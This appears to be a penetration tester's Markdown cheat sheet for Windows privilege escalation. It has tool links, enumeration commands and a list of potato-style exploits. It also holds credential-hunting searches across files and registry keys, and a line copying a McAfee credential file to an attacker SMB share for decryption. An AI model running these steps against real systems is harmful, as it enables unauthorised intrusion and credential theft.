# Privilege Escalation

## Scripts

* [https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)
* [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [windows-exploit-suggester.py](https://github.com/GDSSecurity/Windows-Exploit-Suggester.git)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)

## Articles

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
* [https://pentestlab.blog/2017/04/24/windows-kernel-exploits/](https://pentestlab.blog/2017/04/24/windows-kernel-exploits/)
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
* [https://blog.thehackingnomad.com/cheat-sheet-series/privesc-windows](https://blog.thehackingnomad.com/cheat-sheet-series/privesc-windows)

## Manual Enumeration

```
# Current user and hostname
whoami
whoami /priv
net user <user>
hostname

# Existing users
net user
wmic useraccount list full

# OS version & architecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

### Check C:\Windows\System32\ntdll.dll version
http://www.geoffchappell.com/studies/windows/win32/ntdll/history/index.htm

# Processes & services
tasklist /SVC
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
reg query "HKLM\SYSTEM\CurrentControlSet\Services"
sc query state= all

# Networking info
ipconfig /all
route print
netstat -ano

# Firewall
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all

# Scheduled tasks
schtasks /query /fo LIST /v

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

### Create scheduled task
schtasks /create /sc minute /mo 1 /tn "my_task" /tr "COMMAND" /ru "SYSTEM"

### Check what a is doing a scheduled task
schtasks /query /FO LIST /v
type C:\Windows\Tasks\...

# Installed applications & patch level
wmic product get name,version,vendor
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Check for readable/writable files & directories
# leverage accesschk.exe from sysinternals
accesschk.exe -uws "Everyone" "C:\Program Files"
# powershell version
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# Enumerate unmounted disks
mountvol

# List device drivers & kernel modules
# powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
# list non-windows drivers, using with sigcheck.exe
driverquery.exe /v /fo csv | ConvertFrom-CSV | ForEach-Object {.\sigcheck.exe -c -nobanner $_.Path | ConvertFrom-CSV -Delimiter ',' | select-object path,publisher,verified | Where-Object {$_.Publisher -ne "Microsoft Windows"}}

# Check binaries that autoelevate
# check status of AlwaysInstallElevated setting. If enabled, any user can run MSI packages with elevated privileges.
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
# check binary manifest using sigcheck from SysInternalsSuite
sigcheck.exe -a -m <full_binary_path>

# Check binary permissions
icacls <full_binary_path>

# Search for interesting files
dir /b /s .
dir /b /s c:\*.txt
dir /b /s *pass*
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
findstr /si password *.txt 
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*
dir /b /s Services.xml == ScheduledTasks.xml == Printers.xml == Drives.xml == DataSources.xml
findstr /si password file.xml
dir /s C:\Users

c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

C:\inetpub\wwwroot\web.config

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

#on target
#search for file SiteList.xml
dir /s/b SiteList.xml
#copy file to kali (after setting up impacket-smbserver)
cp "C:\Users\All Users\McAfee\Common Framework\SiteList.xml" //192.168.194.141/share/tmp

#on kali
#grep encrypted password
grep -i password SiteList.xml
#decrypt password 
python mcafee_sitelist_pwd_decrypt.py [encryptedpassw]

# Check registry entries
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
	#NOTE: if you get redirected, use that redirect 
	reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s


```

## Exploits

* JuicyPotato (Server 2008 R2, 2012, 2012 R2, 2016)
* PrintSpoofer
* RogueWinRM
* RoguePotato
